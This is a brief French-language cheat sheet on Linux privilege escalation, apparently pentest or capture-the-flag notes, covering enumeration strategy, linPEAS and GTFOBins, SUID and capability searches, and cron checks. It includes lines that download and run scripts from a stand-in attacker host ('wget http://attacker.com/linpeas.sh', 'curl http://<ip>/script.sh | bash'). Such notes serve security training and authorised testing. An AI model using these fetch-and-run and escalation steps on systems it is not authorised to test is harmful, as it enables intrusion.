# Linux

## Stratégie

* Version de Linux -> exploit ?
* Historique utilisateur, bashrc, bash history, variable ENV
* Cron qui tournent avec des scripts sur lesquels on a des droits en écriture
* Recherche d'exploits avec des binaires : GTFOBins
* `sudo -l` pour voir ce que tu peux exec en root -> GTFOBins
* `find / -perm -u=s -type f 2>/dev/null` -> GTFOBins

## Outils

* [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
* [GTFOBins](https://gtfobins.github.io/)

## Commandes

```bash
# linpeas.sh
wget http://attacker.com/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

id
sudo -l
crontab -l
env
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null
getcap -r / 2>/dev/null
ps aux
ss -tln
netstat -taupen

# regarder les binaires liés à un group
find / -group bugtracker 2>/dev/null

# infos sur un fichier (looking for setuid, suid)
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
```

## Exécuter un script Bash

```bash
cat script.sh | bash
curl http://<ip>/script.sh | bash
```
